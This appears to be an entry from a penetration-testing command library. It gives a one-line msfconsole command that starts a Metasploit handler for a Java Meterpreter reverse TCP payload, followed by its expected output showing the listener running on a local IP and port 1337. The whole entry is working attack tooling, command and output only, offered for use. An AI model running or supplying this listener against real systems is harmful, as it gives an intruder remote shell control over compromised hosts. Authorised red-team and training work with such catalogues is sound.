---
id: 3a1ce76e-6dae-418b-b160-4cc6f21b6c79
name: msfconsole Java Meterpreter Listener
type: command
executor: bash
data: msfconsole -q -x "use exploit/multi/handler;set PAYLOAD java/meterpreter/reverse_tcp;
  set LHOST $LOCAL_IP; set LPORT $LOCAL_PORT; run;exit -y"
output: 'root@hackers:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD java/meterpreter/reverse_tcp;
  set LHOST 172.16.162.187; set LPORT 1337; run;exit -y"

  [-] ***

  [-] * WARNING: No database support: No database YAML file

  [-] ***

  PAYLOAD => java/meterpreter/reverse_tcp

  LHOST => 172.16.162.187

  LPORT => 1337

  [*] Started reverse TCP handler on 172.16.162.187:1337 '
created_at: '2019-09-17T17:35:37.339131+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# msfconsole Java Meterpreter Listener

```bash
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD java/meterpreter/reverse_tcp; set LHOST $LOCAL_IP; set LPORT $LOCAL_PORT; run;exit -y"
```

## Expected Output

```
root@hackers:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD java/meterpreter/reverse_tcp; set LHOST 172.16.162.187; set LPORT 1337; run;exit -y"
[-] ***
[-] * WARNING: No database support: No database YAML file
[-] ***
PAYLOAD => java/meterpreter/reverse_tcp
LHOST => 172.16.162.187
LPORT => 1337
[*] Started reverse TCP handler on 172.16.162.187:1337 
```


